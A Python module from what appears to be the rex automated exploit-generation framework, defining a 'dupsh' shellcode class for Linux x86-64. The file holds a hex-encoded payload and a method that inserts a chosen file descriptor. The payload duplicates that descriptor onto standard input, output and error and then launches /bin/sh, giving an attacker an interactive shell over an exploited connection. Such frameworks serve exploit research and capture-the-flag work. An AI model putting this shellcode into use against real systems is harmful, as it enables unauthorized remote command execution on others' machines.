import logging
from rex.exploit.shellcode import Shellcode

l = logging.getLogger("rex.exploit.shellcodes.linux_amd64_dupsh")

class LinuxAMD64Dupsh(Shellcode):
    # TODO: should be 'linux' once CLE can identify linux files
    supported_platforms = ["unix"]

    arch = "AMD64"

    name = "dupsh"

    hex_code = "4883c4406a%02x5d6a035e48ffce780b566a21584889ef0f05ebef6a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b580f05"

    def to_raw(self, fd):
        #pylint:disable=arguments-differ
        l.debug("generating dupsh from fd %d", fd)

        if fd < 0 or fd >= 256:
            raise ValueError("invalid fd specified")

        return bytes.fromhex(self.hex_code % fd)

    @property
    def has_options(self):
        return True
